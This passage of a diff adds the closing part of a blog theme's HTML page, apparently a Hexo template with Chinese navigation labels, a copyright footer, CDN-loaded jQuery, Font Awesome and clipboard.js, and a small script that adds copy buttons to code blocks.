+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
